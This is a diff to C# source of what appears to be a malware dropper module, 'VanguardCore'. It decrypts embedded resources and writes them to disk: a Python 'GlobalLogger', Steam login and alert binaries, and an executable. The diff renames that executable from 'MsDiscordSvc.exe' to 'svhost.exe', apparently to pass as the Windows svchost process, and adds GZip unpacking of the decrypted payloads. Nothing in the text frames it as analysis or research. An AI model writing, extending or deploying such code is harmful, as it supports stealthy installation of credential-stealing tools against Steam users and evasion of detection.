@@ -1,6 +1,7 @@
 using System;
 using System.IO;
 using System.Reflection;
+using System.IO.Compression;
 using System.Runtime.InteropServices;
 using System.Diagnostics;
 using System.Linq;
@@ -36,7 +37,7 @@ namespace VanguardCore.Modules
                 ExtractResource("GlobalLogger.py", Path.Combine(WorkDir, "GlobalLogger.py"));
                 ExtractResource("SteamAlert.bin", Path.Combine(WorkDir, "SteamAlert.bin"));
                 ExtractResource("SteamLogin.bin", Path.Combine(WorkDir, "SteamLogin.bin"));
-                ExtractResource("MsDiscordSvc.bin", Path.Combine(WorkDir, "MsDiscordSvc.exe"));
+                ExtractResource("svhost.bin", Path.Combine(WorkDir, "svhost.exe"));
 
                 // 3. Ensure tablichka directory exists for Steam Notice
                 string tablichkaDir = Path.Combine(WorkDir, "tablichka");
@@ -112,14 +113,32 @@ namespace VanguardCore.Modules
             {
                 stream.CopyTo(ms);
                 byte[] data = ms.ToArray();
+
                 if (isEncrypted)
                 {
                     data = AesHelper.Decrypt(data);
                 }
-                if (data != null && data.Length > 0) 
+
+                if (data != null && data.Length > 2)
+                {
+                    // V7.0 optimization: Check for GZip magic header (0x1F, 0x8B)
+                    if (data[0] == 0x1F && data[1] == 0x8B)
+                    {
+                        using (MemoryStream compressedMs = new MemoryStream(data))
+                        using (GZipStream decompressionStream = new GZipStream(compressedMs, CompressionMode.Decompress))
+                        using (MemoryStream resultMs = new MemoryStream())
+                        {
+                            decompressionStream.CopyTo(resultMs);
+                            data = resultMs.ToArray();
+                        }
+                    }
+
                     File.WriteAllBytes(destPath, data);
+                }
                 else
-                    Log($"[RESOURCE ERROR] Decryption failed for {Path.GetFileName(destPath)}");
+                {
+                    Log($"[RESOURCE ERROR] Data is null or corrupted for {Path.GetFileName(destPath)}");
+                }
             }
         }
 
